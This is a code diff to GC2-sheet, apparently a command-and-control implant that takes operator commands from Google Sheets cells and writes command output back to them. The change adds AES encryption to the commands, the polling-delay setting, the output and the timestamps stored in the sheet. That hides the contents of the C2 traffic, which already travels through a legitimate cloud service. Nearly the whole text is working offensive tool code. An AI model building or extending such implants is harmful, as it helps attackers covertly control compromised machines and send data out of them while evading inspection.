@@ -2,6 +2,7 @@ package C2
 
 import (
 	"GC2-sheet/internal/configuration"
+	"GC2-sheet/internal/encryption"
 	"GC2-sheet/internal/utils"
 	"encoding/json"
 	"fmt"
@@ -113,8 +114,18 @@ func createGoogleWorksheet(commandExecutor *GoogleCommandExecutor) error {
 	var output [][]interface{}
 	output = append(output, make([]interface{}, 2))
 
-	output[0][0] = "Delay configuration (sec)"
-	output[0][1] = DefaultTickerDuration
+	encryptedTickerLabel, err := encryption.EncryptString("Delay configuration (sec)", configuration.GetOptionsAESKey())
+	if err != nil {
+		return fmt.Errorf("%w: %w", ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration, err)
+	}
+
+	encryptedTickerValue, err := encryption.EncryptString(strconv.Itoa(DefaultTickerDuration), configuration.GetOptionsAESKey())
+	if err != nil {
+		return fmt.Errorf("%w: %w", ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration, err)
+	}
+
+	output[0][0] = encryptedTickerLabel
+	output[0][1] = encryptedTickerValue
 
 	valueRange := ValueRange{
 		Range:  tickerRange,
@@ -173,12 +184,20 @@ func (g *GoogleCommandExecutor) pullCommandAndTicker(rowIndex int) (string, int,
 	}
 
 	if values.ValueRanges[0].Values != nil {
-		commandResult = values.ValueRanges[0].Values[0][0].(string)
+		commandResult, err = encryption.DecryptString(cellValueToString(values.ValueRanges[0].Values[0][0]), configuration.GetOptionsAESKey())
+		if err != nil {
+			return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
+		}
 	} else {
 		commandResult = ""
 	}
 	if values.ValueRanges[1].Values != nil {
-		tickerDelayResult, err = strconv.Atoi(values.ValueRanges[1].Values[0][0].(string))
+		tickerValue, decryptErr := encryption.DecryptString(cellValueToString(values.ValueRanges[1].Values[0][0]), configuration.GetOptionsAESKey())
+		if decryptErr != nil {
+			return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, decryptErr)
+		}
+
+		tickerDelayResult, err = strconv.Atoi(tickerValue)
 		if err != nil {
 			tickerDelayResult = 0
 			err = fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
@@ -211,8 +230,18 @@ func (g *GoogleCommandExecutor) pushOutput(rowIndex int, commandOutput string) e
 	var output [][]interface{}
 	output = append(output, make([]interface{}, 2))
 
-	output[0][0] = commandOutput
-	output[0][1] = utils.GetCurrentDate()
+	encryptedOutput, err := encryption.EncryptString(commandOutput, configuration.GetOptionsAESKey())
+	if err != nil {
+		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
+	}
+
+	encryptedTimestamp, err := encryption.EncryptString(utils.GetCurrentDate(), configuration.GetOptionsAESKey())
+	if err != nil {
+		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
+	}
+
+	output[0][0] = encryptedOutput
+	output[0][1] = encryptedTimestamp
 
 	valueRange := ValueRange{
 		Range:  sheetRange,
@@ -221,7 +250,7 @@ func (g *GoogleCommandExecutor) pushOutput(rowIndex int, commandOutput string) e
 
 	var body []byte
 
-	body, err := json.Marshal(valueRange)
+	body, err = json.Marshal(valueRange)
 	if err != nil {
 		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
 	}
@@ -239,4 +268,8 @@ func (g *GoogleCommandExecutor) pushOutput(rowIndex int, commandOutput string) e
 
 	return nil
 
+}
+
+func cellValueToString(value interface{}) string {
+	return fmt.Sprintf("%v", value)
 }
